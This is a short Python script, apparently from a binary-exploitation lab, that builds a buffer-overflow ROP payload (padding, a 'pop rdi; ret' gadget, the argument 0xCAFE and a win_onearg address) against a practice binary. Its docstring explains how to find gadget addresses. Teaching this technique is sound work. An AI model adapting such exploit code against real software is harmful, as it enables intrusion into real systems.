#!/usr/bin/env python3
# SPDX-License-Identifier: BSD-3-Clause
"""
Goal 2: redirect execution to win_onearg(0xCAFE).

In 64-bit mode the first argument must be in RDI before the call.
We use a 'pop rdi; ret' gadget to load the value into RDI.

ROP chain after padding:
  pop_rdi_ret   <- gadget address
  0xCAFE        <- value popped into RDI
  win_onearg    <- called with RDI = 0xCAFE

Find addresses:
  nm rop_target | grep win_onearg
  ROPgadget --binary rop_target | grep "pop rdi"
"""

import os, struct

def p64(n): return struct.pack("<Q", n)

# ── set these after running the commands above ────────────────────────────────
pop_rdi_ret    = 0x0000000000401353   # PLACEHOLDER: pop rdi; ret gadget
win_onearg_addr = 0x0000000000401260  # PLACEHOLDER
arg_a           = 0xCAFE
# ─────────────────────────────────────────────────────────────────────────────

offset = 72

payload  = offset * b"A"
payload += p64(pop_rdi_ret)     # gadget: pop rdi; ret  -> RDI = arg_a
payload += p64(arg_a)
payload += p64(win_onearg_addr) # call win_onearg(RDI)

os.write(1, payload)
